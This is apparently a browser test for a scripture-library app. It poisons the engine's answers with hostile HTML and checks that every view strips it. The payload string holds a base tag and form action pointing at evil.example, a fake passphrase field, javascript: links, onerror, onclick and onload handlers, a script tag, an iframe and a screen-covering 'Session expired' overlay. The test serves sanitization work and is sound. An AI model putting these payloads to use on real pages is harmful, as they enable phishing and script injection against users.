// sanitize: a poisoned page of the library cannot put a form, a base, a video, a top-level link,
// a handler or a screen-covering overlay into the app. The engine's answers are poisoned on
// their way to the page (as if a library row carried the markup), and then the reader, a
// footnote in the sheet, the stage, the passage sheet, Ask's passage cards and the deck are
// each looked at: none of the hostile tags or attributes is there, nothing ran, and the page's
// own words are still shown.
export default async function run(browser, { BASE, PASS, SHOTS }) {
  const errors = [];
  const check = (c, m) => { if (!c) errors.push(m); };
  const ctx = await browser.newContext({ viewport: { width: 1180, height: 820 } });
  const HOSTILE = `<base id="evil-base" href="https://evil.example/"><input id="evil-input" name="passphrase" placeholder="Passphrase"><button id="evil-button" formaction="https://evil.example/x">Sign in</button><video id="evil-video" src="https://evil.example/v.mp4" autoplay></video><a id="evil-top" href="https://evil.example/" target="_top">continue</a><a id="evil-js" href="javascript:window.__evil=1">js</a><div id="evil-cover" style="position:fixed;inset:0;z-index:99999;background:#fff">Session expired</div><img id="evil-img" src="https://evil.example/p.gif" onerror="window.__evil=2"><p id="evil-p" onclick="window.__evil=3" onmouseover="window.__evil=3">tap</p><form id="evil-form" action="https://evil.example/"><textarea id="evil-ta"></textarea><select id="evil-select"><option>x</option></select></form><iframe id="evil-frame" src="https://evil.example/"></iframe><svg id="evil-svg" onload="window.__evil=4"><script>window.__evil=5</script></svg><style id="evil-style">#app{display:none}</style><object id="evil-object" data="https://evil.example/o"></object>`;
  await ctx.addInitScript((hostile) => {
    try { localStorage.setItem("gospel.apiKey", JSON.stringify("sk-ant-test-not-a-key")); } catch (_) {}
    window.__csp = [];
    document.addEventListener("securitypolicyviolation", (e) => window.__csp.push(`${e.violatedDirective} ${e.blockedURI}`));
    // every answer of the engine passes through here; while __poison is set, the fields that
    // hold a page's markup and words get the hostile markup added
    const KEYS = new Set(["body_html", "html", "text", "plain"]);
    const poison = (v, k) => {
      if (typeof v === "string") return KEYS.has(k) ? v + hostile : v;
      if (Array.isArray(v)) return v.map((x) => poison(x, k));
      if (v && typeof v === "object" && Object.getPrototypeOf(v) === Object.prototype) { const o = {}; for (const [kk, vv] of Object.entries(v)) o[kk] = poison(vv, kk); return o; }
      return v;
    };
    const Real = window.Worker;
    window.Worker = class extends Real {
      set onmessage(fn) { super.onmessage = (e) => fn(window.__poison && e.data && e.data.result ? { data: { ...e.data, result: poison(e.data.result, "") } } : e); }
      get onmessage() { return super.onmessage; }
    };
  }, HOSTILE);
  const sse = (events) => events.map((e) => `event: ${e.type}\ndata: ${JSON.stringify(e)}\n\n`).join("");
  let n = 0;
  await ctx.route((u) => u.hostname !== new URL(BASE).hostname, (route) => {
    const req = route.request();
    const cors = { "access-control-allow-origin": "*", "access-control-allow-headers": "*", "access-control-allow-methods": "POST, OPTIONS" };
    if (!req.url().startsWith("https://api.anthropic.com/")) { errors.push(`a request left for ${req.url()}`); return route.abort(); }
    if (req.method() === "OPTIONS") return route.fulfill({ status: 204, headers: cors });
    const body = JSON.parse(req.postData() || "{}");
    if (!body.stream) return route.fulfill({ status: 200, headers: { ...cors, "content-type": "application/json" }, body: JSON.stringify({ content: [{ type: "text", text: '{"queries":[{"q":"faith knowledge","scope":"all"}],"references":[]}' }], stop_reason: "end_turn" }) });
    const searched = /tool_result/.test(JSON.stringify(body.messages || []));
    const events = searched ? [
      { type: "message_start" }, { type: "content_block_start", index: 0, content_block: { type: "text", text: "" } },
      { type: "content_block_delta", index: 0, delta: { type: "text_delta", text: "Faith is not a perfect knowledge [1]." } },
      { type: "content_block_stop", index: 0 }, { type: "message_delta", delta: { stop_reason: "end_turn" } }, { type: "message_stop" },
    ] : [
      { type: "message_start" }, { type: "content_block_start", index: 0, content_block: { type: "tool_use", id: `tu_${++n}`, name: "search", input: {} } },
      { type: "content_block_delta", index: 0, delta: { type: "input_json_delta", partial_json: JSON.stringify({ query: "faith is not to have a perfect knowledge", limit: 3 }) } },
      { type: "content_block_stop", index: 0 }, { type: "message_delta", delta: { stop_reason: "tool_use" } }, { type: "message_stop" },
    ];
    return route.fulfill({ status: 200, headers: { ...cors, "content-type": "text/event-stream" }, body: sse(events) });
  });
  const page = await ctx.newPage();
  page.on("pageerror", (e) => errors.push(`pageerror: ${e}`));
  await page.goto(BASE);
  await page.fill("div.setup input", PASS);
  await page.press("div.setup input", "Enter");
  await page.waitForSelector("#homeBody .shelf-grid", { timeout: 120000 });

  // What is left of the hostile markup anywhere in the page: the tags that must not be there,
  // and on what was kept (a paragraph, a link, a block) the attributes that must not be.
  const left = () => page.evaluate(() => {
    const out = [];
    for (const n of document.querySelectorAll("[id^=evil]")) {
      if (/^(BASE|INPUT|BUTTON|VIDEO|FORM|TEXTAREA|SELECT|IFRAME|STYLE|SCRIPT|OBJECT|IMG|svg)$/.test(n.tagName)) out.push(`<${n.tagName.toLowerCase()}>`);
      for (const a of n.attributes) if (/^on|^(style|target|formaction|action|autoplay)$/i.test(a.name) || /^\s*javascript:/i.test(a.value)) out.push(`${n.id} ${a.name}`);
      if (getComputedStyle(n).position === "fixed") out.push(`${n.id} is fixed`);
    }
    if (document.querySelector("base")) out.push("a base in the page");
    if (window.__evil !== undefined) out.push(`a handler ran (${window.__evil})`);
    return out;
  });
  const kept = (sel) => page.evaluate((sel) => [...document.querySelectorAll(sel)].map((n) => n.id), sel);

  // the reader
  const alma = await page.evaluate(async () => (await GL.api("search", { q: "Alma 32:21", limit: 1 })).jump);
  await page.evaluate(() => { window.__poison = true; });
  await page.evaluate((id) => GL.openDoc(id), alma.doc_id);
  await page.waitForSelector("#reader .doc .verse", { timeout: 10000 });
  await page.waitForTimeout(400);
  check((await left()).length === 0, `the reader kept: ${(await left()).join(", ")}`);
  const inDoc = await kept("#reader .doc [id^=evil]");
  check(inDoc.includes("evil-cover") && inDoc.includes("evil-p") && inDoc.includes("evil-top"), `the harmless parts of the page should still show (a block, a paragraph, a link): ${inDoc.join(", ")}`);
  check((await page.locator("#reader .doc .verse").count()) > 20 && /faith is not to have a perfect knowledge/.test(await page.textContent("#reader .doc")), "the chapter itself did not show");
  check((await page.getAttribute("#reader .doc #evil-top", "href")) === "https://evil.example/" && (await page.getAttribute("#reader .doc #evil-js", "href")) === null, "a web link keeps its address and a javascript: link loses it");
  await page.screenshot({ path: `${SHOTS}sanitize-reader.png` });
  // the passage sheet: a link in the page to a verse of another chapter
  await page.evaluate(() => {
    const a = document.createElement("a");
    a.id = "to-peek"; a.textContent = "Hebrews 11:1"; a.href = "https://www.churchofjesuschrist.org/study/scriptures/nt/heb/11?lang=eng&id=p1#p1";
    document.querySelector("#reader .doc").append(a);
  });
  await page.click("#to-peek");
  await page.waitForSelector("#sheet:not([hidden]) .peek p", { timeout: 8000 });
  check(/evil-cover/.test(await page.textContent("#sheet .peek")), "the passage sheet should show a verse's words as words, markup and all");
  check((await left()).length === 0 && (await kept("#sheet .peek [id^=evil]")).length === 0, `the passage sheet kept: ${(await left()).join(", ")}`);
  await page.keyboard.press("Escape");
  await page.waitForTimeout(400);

  // a footnote in the sheet (a page of the Joseph Smith Papers has them in the test library)
  await page.evaluate(() => GL.openDoc(1583));
  await page.waitForSelector("#reader .doc a.study-note-ref", { timeout: 10000 });
  check((await left()).length === 0, `a page of the Papers kept: ${(await left()).join(", ")}`);
  await page.locator("#reader .doc a.study-note-ref").first().click();
  await page.waitForSelector("#sheet:not([hidden]) .sheet-body", { timeout: 8000 });
  await page.waitForTimeout(300);
  check((await kept("#sheet .sheet-body [id^=evil]")).length > 0, "the footnote in the sheet was not the poisoned one (the test did not reach it)");
  check((await left()).length === 0, `a footnote in the sheet kept: ${(await left()).join(", ")}`);
  await page.keyboard.press("Escape");
  await page.waitForTimeout(400);

  await page.evaluate((id) => GL.openDoc(id), alma.doc_id);
  await page.waitForSelector("#reader .doc .verse", { timeout: 10000 });

  // the stage: the page presented, and units handed over as HTML
  await page.evaluate((h) => GL.startPresentingUnits([{ kind: "para", html: `<p>Shown on the stage</p>${h}`, where: "A test" }]), HOSTILE);
  await page.waitForSelector(".stage:not([hidden]) .stage-text", { timeout: 8000 });
  await page.waitForTimeout(300);
  check(/Shown on the stage/.test(await page.textContent(".stage .stage-text")), "the stage did not show the unit");
  check((await left()).length === 0, `the stage kept: ${(await left()).join(", ")}`);
  await page.screenshot({ path: `${SHOTS}sanitize-stage.png` });
  await page.keyboard.press("Escape");
  await page.waitForTimeout(400);
  await page.keyboard.press("p"); // the page itself, presented
  await page.waitForSelector(".stage:not([hidden]) .stage-text", { timeout: 8000 }).catch(() => errors.push("P did not present the page"));
  for (let i = 0; i < 4; i++) { check((await left()).length === 0, `the page on the stage kept: ${(await left()).join(", ")}`); await page.keyboard.press("ArrowRight"); await page.waitForTimeout(150); }
  await page.keyboard.press("Escape");
  await page.waitForTimeout(400);

  // Ask's passage cards, and one of them on the deck
  await page.click("#askBtn");
  await page.waitForSelector(".ask-input", { timeout: 10000 });
  await page.fill(".ask-input", "What is faith?");
  await page.click(".ask-go");
  await page.waitForSelector(".finding .text", { timeout: 60000 }).catch(() => errors.push("Ask showed no passage card"));
  await page.waitForFunction(() => /perfect knowledge \[?1?/.test(document.querySelector(".ask-card .ask-a")?.textContent || ""), null, { timeout: 30000 }).catch(() => {});
  check(/evil-cover/.test(await page.textContent(".finding .text").catch(() => "")), "a passage card should show the passage's words as words");
  check((await left()).length === 0 && (await kept(".ask-card [id^=evil]")).length === 0, `Ask's passage cards kept: ${(await left()).join(", ")}`);
  await page.screenshot({ path: `${SHOTS}sanitize-ask.png` });
  await page.locator(".finding .pick input").first().check();
  await page.waitForTimeout(600);
  await page.evaluate(() => window.Deck.showBoard());
  await page.waitForSelector(".bcard[data-type='passage']", { timeout: 8000 }).catch(() => errors.push("the passage did not reach the deck"));
  check(/evil-cover/.test(await page.textContent(".bcard[data-type='passage']").catch(() => "")), "the deck card should show the passage's words as words");
  check((await left()).length === 0 && (await kept(".bcard [id^=evil]")).length === 0, `the deck kept: ${(await left()).join(", ")}`);
  await page.screenshot({ path: `${SHOTS}sanitize-deck.png` });
  // and the deck presented
  await page.evaluate(() => window.Deck.present && window.Deck.present());
  await page.waitForTimeout(600);
  check((await left()).length === 0, `the deck on the stage kept: ${(await left()).join(", ")}`);
  await page.keyboard.press("Escape");

  // nothing was let through for the policy to stop: no handler was ever attached, no outside address asked for
  const csp = await page.evaluate(() => window.__csp);
  check(csp.length === 0, `the cleaning left work for the policy: ${csp.slice(0, 4).join("; ")}`);
  await page.evaluate(async () => { window.__poison = false; try { for (const it of [...(window.Deck.items?.() || [])]) window.Deck.remove(it.doc_id, it.pid); } catch (_) {} });
  await ctx.close();
  return errors;
}
